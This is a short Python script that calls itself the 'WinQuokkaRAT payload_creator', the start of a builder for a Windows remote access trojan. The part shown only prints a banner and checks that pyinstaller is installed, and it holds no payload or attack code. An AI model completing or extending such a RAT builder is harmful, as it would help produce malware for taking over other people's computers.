import os, subprocess

VERSION = "develop1.0 by jeho"

def print_sharp(end):
    for i in range(0,end):
        print('#',end='')
        if(i==end-1):
            print()

def check_dependancy(dependancy_dict):
    for key in dependancy_dict:
        print(f"Checking if it is installed... : {key}")
        try:
            result = subprocess.run(f"{dependancy_dict[key]}",capture_output=True)
            print(f"{key} is already instelled...")

        except Exception as e:
            print(f"dependancy doesn't installed : {e}")

print(VERSION)
print_sharp(50)
print("hello, its WinQuokkaRAT payload_creator")
print("creating winQuokkaRAT payload exe...")

dependancy_dict= {"pyinstaller":"pyinstaller --version"}
check_dependancy(dependancy_dict)


